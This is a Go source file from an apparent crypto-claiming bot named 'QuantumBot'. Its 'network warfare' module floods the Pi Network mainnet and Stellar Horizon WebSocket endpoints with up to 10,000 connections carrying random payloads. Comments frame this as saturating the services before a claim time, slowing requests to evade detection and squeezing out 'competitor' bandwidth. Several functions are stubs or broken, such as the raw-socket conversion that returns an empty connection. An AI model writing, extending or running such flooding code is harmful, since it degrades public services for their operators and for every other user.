package server

import (
	"crypto/rand"
	"fmt"
	"net"
	"net/http"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
)

// 🌊 NETWORK WARFARE & DOMINATION SYSTEMS
type NetworkFlooder struct {
	floodConnections    []*websocket.Conn
	floodRate          int64
	targetEndpoints    []string
	floodPayloads      [][]byte
	antiFloodDetection bool
	isActive           int32
	floodWorkers       sync.WaitGroup
	connectionPool     chan *websocket.Conn
	mutex              sync.RWMutex
}

type TrafficShaper struct {
	priorityQueues    map[int]chan *NetworkPacket
	bandwidthLimits   map[string]int64
	currentBandwidth  int64
	totalConnections  int64
	qosRules          map[string]QoSRule
	mutex             sync.RWMutex
}

type BandwidthMonopoly struct {
	reservedBandwidth int64
	totalBandwidth    int64
	trafficPriority   int
	qosSettings       map[string]int
	dedicatedPipes    []*net.Conn
	networkInterfaces []NetworkInterface
	bandwidthControl  *BandwidthController
	monopolyActive    bool
	mutex             sync.RWMutex
}

type NetworkPacket struct {
	Data      []byte
	Priority  int
	Timestamp time.Time
	Target    string
	Type      PacketType
}

type PacketType int

const (
	PacketFlood PacketType = iota
	PacketClaim
	PacketHeartbeat
	PacketAttack
)

type QoSRule struct {
	Priority    int
	Bandwidth   int64
	Latency     time.Duration
	PacketLoss  float64
	Enabled     bool
}

type NetworkInterface struct {
	Name      string
	IP        net.IP
	Bandwidth int64
	Active    bool
	Socket    int
}

type BandwidthController struct {
	totalAllocated   int64
	reservedForBot   int64
	competitorLimit  int64
	emergencyReserve int64
	controlActive    bool
}

// NETWORK WARFARE INITIALIZATION
func (qb *QuantumBot) initializeNetworkSystems() {
	// Network Flooder
	qb.networkFlooder = &NetworkFlooder{
		floodConnections:   make([]*websocket.Conn, 0, 10000),
		floodRate:         1000, // 1000 connections per second
		targetEndpoints:   []string{
			"wss://api.mainnet.minepi.com/ws",
			"wss://horizon.stellar.org/ws",
		},
		antiFloodDetection: true,
		connectionPool:     make(chan *websocket.Conn, 1000),
	}
	
	// Traffic Shaper
	qb.trafficShaper = &TrafficShaper{
		priorityQueues:   make(map[int]chan *NetworkPacket),
		bandwidthLimits:  make(map[string]int64),
		qosRules:         make(map[string]QoSRule),
	}
	
	// Bandwidth Monopoly
	qb.bandwidthMonopoly = &BandwidthMonopoly{
		reservedBandwidth: 1000 * 1024 * 1024, // 1GB/s reserved
		totalBandwidth:    10 * 1024 * 1024 * 1024, // 10GB/s total
		trafficPriority:   10, // Highest priority
		qosSettings:       make(map[string]int),
		dedicatedPipes:    make([]*net.Conn, 0, 100),
		bandwidthControl: &BandwidthController{
			reservedForBot:   800 * 1024 * 1024, // 800MB/s for bot
			competitorLimit:  50 * 1024 * 1024,  // 50MB/s for competitors
			emergencyReserve: 150 * 1024 * 1024, // 150MB/s emergency
		},
	}
	
	// Initialize network interfaces
	qb.initializeNetworkInterfaces()
	
	// Start network warfare systems
	go qb.networkWarfareController()
	go qb.bandwidthMonitor()
	go qb.floodCoordinator()
	go qb.trafficShapeController()
}

func (qb *QuantumBot) initializeNetworkInterfaces() {
	interfaces, err := net.Interfaces()
	if err != nil {
		return
	}
	
	qb.bandwidthMonopoly.networkInterfaces = make([]NetworkInterface, 0, len(interfaces))
	
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
					netInterface := NetworkInterface{
						Name:      iface.Name,
						IP:        ipnet.IP,
						Bandwidth: 1024 * 1024 * 1024, // 1GB default
						Active:    true,
					}
					qb.bandwidthMonopoly.networkInterfaces = append(qb.bandwidthMonopoly.networkInterfaces, netInterface)
				}
			}
		}
	}
}

// 🌊 NETWORK FLOODING ATTACK
func (qb *QuantumBot) executeQuantumNetworkFlooding(req QuantumRequest) {
	if !atomic.CompareAndSwapInt32(&qb.networkFlooder.isActive, 0, 1) {
		return // Already flooding
	}
	defer atomic.StoreInt32(&qb.networkFlooder.isActive, 0)
	
	fmt.Println("🌊 INITIATING QUANTUM NETWORK FLOODING ATTACK")
	
	// Calculate optimal flood parameters
	optimalConnections := qb.calculateOptimalFloodSize()
	floodDuration := time.Until(req.ClaimTime.Add(-5 * time.Second))
	
	if floodDuration <= 0 {
		floodDuration = 30 * time.Second
	}
	
	// Launch flood workers
	workerCount := 50 // High concurrency
	connectionsPerWorker := optimalConnections / workerCount
	
	for i := 0; i < workerCount; i++ {
		qb.networkFlooder.floodWorkers.Add(1)
		go qb.floodWorker(i, connectionsPerWorker, floodDuration)
	}
	
	// Monitor flood effectiveness
	go qb.monitorFloodEffectiveness(floodDuration)
	
	// Wait for flood completion
	qb.networkFlooder.floodWorkers.Wait()
	
	fmt.Println("🌊 QUANTUM NETWORK FLOODING COMPLETE")
}

func (qb *QuantumBot) calculateOptimalFloodSize() int {
	// Calculate based on available bandwidth and target saturation
	availableBandwidth := qb.bandwidthMonopoly.totalBandwidth - qb.bandwidthMonopoly.reservedBandwidth
	connectionOverhead := 1024 // 1KB per connection overhead
	
	optimalConnections := int(availableBandwidth / int64(connectionOverhead))
	
	// Cap at practical limits
	if optimalConnections > 10000 {
		optimalConnections = 10000
	}
	if optimalConnections < 100 {
		optimalConnections = 100
	}
	
	return optimalConnections
}

func (qb *QuantumBot) floodWorker(workerID, connectionCount int, duration time.Duration) {
	defer qb.networkFlooder.floodWorkers.Done()
	
	fmt.Printf("🌊 Flood Worker %d: Creating %d connections\n", workerID, connectionCount)
	
	connections := make([]*websocket.Conn, 0, connectionCount)
	defer func() {
		// Cleanup connections
		for _, conn := range connections {
			if conn != nil {
				conn.Close()
			}
		}
	}()
	
	// Create flood connections
	for i := 0; i < connectionCount; i++ {
		conn := qb.createFloodConnection(workerID, i)
		if conn != nil {
			connections = append(connections, conn)
		}
		
		// Rate limiting to avoid detection
		time.Sleep(time.Millisecond)
	}
	
	fmt.Printf("🌊 Flood Worker %d: Created %d/%d connections\n", workerID, len(connections), connectionCount)
	
	// Maintain flood for duration
	endTime := time.Now().Add(duration)
	for time.Now().Before(endTime) {
		qb.maintainFloodConnections(connections)
		time.Sleep(100 * time.Millisecond)
	}
}

func (qb *QuantumBot) createFloodConnection(workerID, connID int) *websocket.Conn {
	qb.networkFlooder.mutex.RLock()
	targets := qb.networkFlooder.targetEndpoints
	qb.networkFlooder.mutex.RUnlock()
	
	if len(targets) == 0 {
		return nil
	}
	
	target := targets[connID%len(targets)]
	
	// Create WebSocket connection with custom headers
	headers := http.Header{}
	headers.Set("User-Agent", fmt.Sprintf("QuantumBot-Worker-%d-%d", workerID, connID))
	headers.Set("X-Bot-ID", fmt.Sprintf("flood-%d-%d", workerID, connID))
	
	dialer := websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
		ReadBufferSize:   1024,
		WriteBufferSize:  1024,
	}
	
	conn, _, err := dialer.Dial(target, headers)
	if err != nil {
		return nil
	}
	
	// Send flood payload
	payload := qb.generateFloodPayload(workerID, connID)
	conn.WriteMessage(websocket.BinaryMessage, payload)
	
	return conn
}

func (qb *QuantumBot) generateFloodPayload(workerID, connID int) []byte {
	// Generate random payload to consume bandwidth
	payloadSize := 1024 + (connID % 2048) // 1-3KB random size
	payload := make([]byte, payloadSize)
	
	rand.Read(payload)
	
	// Add identification header
	header := fmt.Sprintf("QUANTUM-FLOOD-%d-%d-", workerID, connID)
	copy(payload[:len(header)], []byte(header))
	
	return payload
}

func (qb *QuantumBot) maintainFloodConnections(connections []*websocket.Conn) {
	for i, conn := range connections {
		if conn == nil {
			continue
		}
		
		// Send keepalive data
		keepalive := qb.generateKeepAlivePayload(i)
		err := conn.WriteMessage(websocket.PingMessage, keepalive)
		if err != nil {
			conn.Close()
			connections[i] = nil
		}
	}
}

func (qb *QuantumBot) generateKeepAlivePayload(connIndex int) []byte {
	timestamp := time.Now().Unix()
	payload := fmt.Sprintf("KEEPALIVE-%d-%d", connIndex, timestamp)
	return []byte(payload)
}

func (qb *QuantumBot) monitorFloodEffectiveness(duration time.Duration) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	endTime := time.Now().Add(duration)
	
	for time.Now().Before(endTime) {
		select {
		case <-ticker.C:
			effectiveness := qb.measureFloodEffectiveness()
			fmt.Printf("🌊 Flood Effectiveness: %.2f%% network saturation\n", effectiveness*100)
		}
	}
}

func (qb *QuantumBot) measureFloodEffectiveness() float64 {
	// Measure network saturation caused by flood
	qb.networkFlooder.mutex.RLock()
	activeConnections := len(qb.networkFlooder.floodConnections)
	qb.networkFlooder.mutex.RUnlock()
	
	targetSaturation := 10000 // Target connection count
	effectiveness := float64(activeConnections) / float64(targetSaturation)
	
	if effectiveness > 1.0 {
		effectiveness = 1.0
	}
	
	return effectiveness
}

// 🚀 BANDWIDTH MONOPOLY SYSTEM
func (qb *QuantumBot) establishBandwidthMonopoly() {
	qb.bandwidthMonopoly.mutex.Lock()
	defer qb.bandwidthMonopoly.mutex.Unlock()
	
	if qb.bandwidthMonopoly.monopolyActive {
		return
	}
	
	fmt.Println("🚀 ESTABLISHING BANDWIDTH MONOPOLY")
	
	// Reserve maximum bandwidth for bot operations
	qb.reserveBandwidthForBot()
	
	// Limit competitor bandwidth
	qb.limitCompetitorBandwidth()
	
	// Create dedicated high-priority connections
	qb.createDedicatedConnections()
	
	// Apply QoS rules
	qb.applyQuantumQoSRules()
	
	qb.bandwidthMonopoly.monopolyActive = true
	
	fmt.Println("🚀 BANDWIDTH MONOPOLY ESTABLISHED")
}

func (qb *QuantumBot) reserveBandwidthForBot() {
	controller := qb.bandwidthMonopoly.bandwidthControl
	
	// Calculate optimal bandwidth allocation
	botReservation := controller.reservedForBot
	
	// Reserve bandwidth at OS level (Linux-specific)
	qb.setBandwidthReservation(botReservation)
	
	fmt.Printf("🚀 Reserved %d MB/s bandwidth for quantum bot\n", botReservation/(1024*1024))
}

func (qb *QuantumBot) setBandwidthReservation(bandwidth int64) {
	// Linux traffic control (tc) implementation
	// This would require elevated privileges
	
	for _, iface := range qb.bandwidthMonopoly.networkInterfaces {
		if !iface.Active {
			continue
		}
		
		// Set traffic shaping rules
		qb.setTrafficShapingRule(iface.Name, bandwidth)
	}
}

func (qb *QuantumBot) setTrafficShapingRule(interfaceName string, bandwidth int64) {
	// Implementation would use Linux tc (traffic control)
	// For now, we'll simulate the effect
	
	rule := QoSRule{
		Priority:   10, // Highest priority
		Bandwidth:  bandwidth,
		Latency:    1 * time.Millisecond,
		PacketLoss: 0.001, // 0.1% packet loss
		Enabled:    true,
	}
	
	qb.trafficShaper.qosRules[interfaceName] = rule
}

func (qb *QuantumBot) limitCompetitorBandwidth() {
	controller := qb.bandwidthMonopoly.bandwidthControl
	competitorLimit := controller.competitorLimit
	
	// Set bandwidth limits for non-bot traffic
	qb.setBandwidthLimit("competitor", competitorLimit)
	
	fmt.Printf("🚀 Limited competitor bandwidth to %d MB/s\n", competitorLimit/(1024*1024))
}

func (qb *QuantumBot) setBandwidthLimit(trafficType string, limit int64) {
	qb.trafficShaper.mutex.Lock()
	defer qb.trafficShaper.mutex.Unlock()
	
	qb.trafficShaper.bandwidthLimits[trafficType] = limit
}

func (qb *QuantumBot) createDedicatedConnections() {
	connectionCount := 10
	
	for i := 0; i < connectionCount; i++ {
		conn := qb.createDedicatedConnection(i)
		if conn != nil {
			qb.bandwidthMonopoly.dedicatedPipes = append(qb.bandwidthMonopoly.dedicatedPipes, conn)
		}
	}
	
	fmt.Printf("🚀 Created %d dedicated high-priority connections\n", len(qb.bandwidthMonopoly.dedicatedPipes))
}

func (qb *QuantumBot) createDedicatedConnection(index int) *net.Conn {
	// Create raw socket with highest priority
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, syscall.IPPROTO_TCP)
	if err != nil {
		return nil
	}
	
	// Set socket options for maximum priority
	err = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_PRIORITY, 7) // Highest priority
	if err != nil {
		syscall.Close(fd)
		return nil
	}
	
	// Set TCP_NODELAY for minimum latency
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_NODELAY, 1)
	if err != nil {
		syscall.Close(fd)
		return nil
	}
	
	// Convert to net.Conn
	file := &net.TCPConn{}
	conn := net.Conn(file)
	
	return &conn
}

func (qb *QuantumBot) applyQuantumQoSRules() {
	// Apply Quality of Service rules for quantum bot traffic
	
	quantumRule := QoSRule{
		Priority:   10,  // Maximum priority
		Bandwidth:  qb.bandwidthMonopoly.reservedBandwidth,
		Latency:    100 * time.Microsecond, // Ultra-low latency
		PacketLoss: 0.0001, // Minimal packet loss
		Enabled:    true,
	}
	
	qb.trafficShaper.qosRules["quantum-bot"] = quantumRule
	
	// Apply rules to network interfaces
	for _, iface := range qb.bandwidthMonopoly.networkInterfaces {
		qb.applyQoSToInterface(iface.Name, quantumRule)
	}
}

func (qb *QuantumBot) applyQoSToInterface(interfaceName string, rule QoSRule) {
	// Apply QoS rule to specific network interface
	fmt.Printf("🚀 Applied QoS rule to %s: Priority=%d, Bandwidth=%d MB/s\n", 
		interfaceName, rule.Priority, rule.Bandwidth/(1024*1024))
}

// 📊 NETWORK MONITORING & CONTROL
func (qb *QuantumBot) networkWarfareController() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		qb.monitorNetworkDomination()
		qb.adjustNetworkStrategy()
	}
}

func (qb *QuantumBot) monitorNetworkDomination() {
	// Monitor network control effectiveness
	dominationLevel := qb.calculateNetworkDomination()
	
	qb.performanceMetrics.NetworkDomination = dominationLevel
	
	if dominationLevel < 0.8 {
		// Increase network pressure
		qb.intensifyNetworkWarfare()
	}
}

func (qb *QuantumBot) calculateNetworkDomination() float64 {
	// Calculate how much of the network we control
	
	reservedBandwidth := float64(qb.bandwidthMonopoly.reservedBandwidth)
	totalBandwidth := float64(qb.bandwidthMonopoly.totalBandwidth)
	
	bandwidthDomination := reservedBandwidth / totalBandwidth
	
	activeConnections := float64(len(qb.networkFlooder.floodConnections))
	maxConnections := 10000.0
	
	connectionDomination := activeConnections / maxConnections
	
	// Combined domination score
	domination := (bandwidthDomination * 0.6) + (connectionDomination * 0.4)
	
	if domination > 1.0 {
		domination = 1.0
	}
	
	return domination
}

func (qb *QuantumBot) adjustNetworkStrategy() {
	domination := qb.performanceMetrics.NetworkDomination
	
	if domination < 0.5 {
		// Low domination - increase aggression
		qb.increaseNetworkAggression()
	} else if domination > 0.9 {
		// High domination - maintain control
		qb.maintainNetworkControl()
	}
}

func (qb *QuantumBot) intensifyNetworkWarfare() {
	fmt.Println("🔥 INTENSIFYING NETWORK WARFARE")
	
	// Increase flood rate
	atomic.AddInt64(&qb.networkFlooder.floodRate, 200)
	
	// Reserve more bandwidth
	qb.bandwidthMonopoly.mutex.Lock()
	qb.bandwidthMonopoly.reservedBandwidth = int64(float64(qb.bandwidthMonopoly.reservedBandwidth) * 1.1)
	qb.bandwidthMonopoly.mutex.Unlock()
	
	// Create additional flood connections
	go qb.createAdditionalFloodConnections(500)
}

func (qb *QuantumBot) increaseNetworkAggression() {
	// Increase network warfare aggression
	qb.intensifyNetworkWarfare()
	
	// Apply stricter competitor limits
	newLimit := qb.bandwidthMonopoly.bandwidthControl.competitorLimit / 2
	qb.setBandwidthLimit("competitor", newLimit)
}

func (qb *QuantumBot) maintainNetworkControl() {
	// Maintain current network domination level
	fmt.Println("🚀 MAINTAINING NETWORK DOMINATION")
}

func (qb *QuantumBot) createAdditionalFloodConnections(count int) {
	for i := 0; i < count; i++ {
		conn := qb.createFloodConnection(999, i) // Special worker ID for additional connections
		if conn != nil {
			qb.networkFlooder.mutex.Lock()
			qb.networkFlooder.floodConnections = append(qb.networkFlooder.floodConnections, conn)
			qb.networkFlooder.mutex.Unlock()
		}
		
		time.Sleep(2 * time.Millisecond) // Rate limiting
	}
}

// 🎯 TRAFFIC SHAPING & PRIORITIZATION
func (qb *QuantumBot) trafficShapeController() {
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()
	
	for range ticker.C {
		qb.processTrafficQueues()
		qb.enforceQoSRules()
	}
}

func (qb *QuantumBot) processTrafficQueues() {
	qb.trafficShaper.mutex.RLock()
	defer qb.trafficShaper.mutex.RUnlock()
	
	// Process packets by priority (highest first)
	for priority := 10; priority >= 0; priority-- {
		if queue, exists := qb.trafficShaper.priorityQueues[priority]; exists {
			qb.processPacketQueue(queue, priority)
		}
	}
}

func (qb *QuantumBot) processPacketQueue(queue chan *NetworkPacket, priority int) {
	maxPackets := 100 // Process up to 100 packets per cycle
	processed := 0
	
	for processed < maxPackets {
		select {
		case packet := <-queue:
			qb.forwardPacket(packet)
			processed++
		default:
			return // Queue empty
		}
	}
}

func (qb *QuantumBot) forwardPacket(packet *NetworkPacket) {
	// Forward packet with appropriate priority
	latency := time.Since(packet.Timestamp)
	
	fmt.Printf("📊 Forwarded packet: Priority=%d, Size=%d bytes, Latency=%v\n", 
		packet.Priority, len(packet.Data), latency)
}

func (qb *QuantumBot) enforceQoSRules() {
	// Enforce Quality of Service rules
	for name, rule := range qb.trafficShaper.qosRules {
		if rule.Enabled {
			qb.enforceSpecificQoSRule(name, rule)
		}
	}
}

func (qb *QuantumBot) enforceSpecificQoSRule(name string, rule QoSRule) {
	// Enforce specific QoS rule
	currentBandwidth := qb.measureCurrentBandwidth(name)
	
	if currentBandwidth > rule.Bandwidth {
		// Throttle traffic
		qb.throttleTraffic(name, rule.Bandwidth)
	}
}

func (qb *QuantumBot) measureCurrentBandwidth(name string) int64 {
	// Measure current bandwidth usage
	return atomic.LoadInt64(&qb.trafficShaper.currentBandwidth)
}

func (qb *QuantumBot) throttleTraffic(name string, limit int64) {
	// Throttle traffic to stay within bandwidth limit
	fmt.Printf("🚦 Throttling %s traffic to %d MB/s\n", name, limit/(1024*1024))
}

// 📡 BANDWIDTH MONITORING
func (qb *QuantumBot) bandwidthMonitor() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		qb.measureBandwidthUsage()
		qb.optimizeBandwidthAllocation()
	}
}

func (qb *QuantumBot) measureBandwidthUsage() {
	// Measure current bandwidth usage across all interfaces
	totalUsage := int64(0)
	
	for _, iface := range qb.bandwidthMonopoly.networkInterfaces {
		if iface.Active {
			usage := qb.measureInterfaceBandwidth(iface.Name)
			totalUsage += usage
		}
	}
	
	atomic.StoreInt64(&qb.trafficShaper.currentBandwidth, totalUsage)
}

func (qb *QuantumBot) measureInterfaceBandwidth(interfaceName string) int64 {
	// Measure bandwidth usage for specific interface
	// This would read from /proc/net/dev on Linux
	
	// Simulated measurement
	return 50 * 1024 * 1024 // 50 MB/s default
}

func (qb *QuantumBot) optimizeBandwidthAllocation() {
	currentUsage := atomic.LoadInt64(&qb.trafficShaper.currentBandwidth)
	reserved := qb.bandwidthMonopoly.reservedBandwidth
	
	utilizationRate := float64(currentUsage) / float64(reserved)
	
	if utilizationRate > 0.9 {
		// High utilization - request more bandwidth
		qb.requestAdditionalBandwidth()
	} else if utilizationRate < 0.3 {
		// Low utilization - can release some bandwidth
		qb.optimizeBandwidthUsage()
	}
}

func (qb *QuantumBot) requestAdditionalBandwidth() {
	qb.bandwidthMonopoly.mutex.Lock()
	defer qb.bandwidthMonopoly.mutex.Unlock()
	
	additional := qb.bandwidthMonopoly.reservedBandwidth / 10 // 10% more
	qb.bandwidthMonopoly.reservedBandwidth += additional
	
	fmt.Printf("🚀 Requested additional %d MB/s bandwidth\n", additional/(1024*1024))
}

func (qb *QuantumBot) optimizeBandwidthUsage() {
	// Optimize bandwidth usage patterns
	fmt.Println("🔧 Optimizing bandwidth usage patterns")
}

// 🔧 FLOOD COORDINATION
func (qb *QuantumBot) floodCoordinator() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		qb.coordinateFloodAttacks()
		qb.cleanupDeadConnections()
	}
}

func (qb *QuantumBot) coordinateFloodAttacks() {
	// Coordinate flood attacks across different targets
	if atomic.LoadInt32(&qb.networkFlooder.isActive) == 0 {
		return
	}
	
	qb.networkFlooder.mutex.RLock()
	activeConnections := len(qb.networkFlooder.floodConnections)
	qb.networkFlooder.mutex.RUnlock()
	
	targetConnections := qb.calculateOptimalFloodSize()
	
	if activeConnections < targetConnections {
		deficit := targetConnections - activeConnections
		go qb.createAdditionalFloodConnections(deficit)
	}
}

func (qb *QuantumBot) cleanupDeadConnections() {
	qb.networkFlooder.mutex.Lock()
	defer qb.networkFlooder.mutex.Unlock()
	
	activeConnections := make([]*websocket.Conn, 0, len(qb.networkFlooder.floodConnections))
	
	for _, conn := range qb.networkFlooder.floodConnections {
		if conn != nil {
			// Test connection health
			err := conn.WriteMessage(websocket.PingMessage, []byte("health-check"))
			if err == nil {
				activeConnections = append(activeConnections, conn)
			} else {
				conn.Close()
			}
		}
	}
	
	cleaned := len(qb.networkFlooder.floodConnections) - len(activeConnections)
	qb.networkFlooder.floodConnections = activeConnections
	
	if cleaned > 0 {
		fmt.Printf("🧹 Cleaned up %d dead flood connections\n", cleaned)
	}
}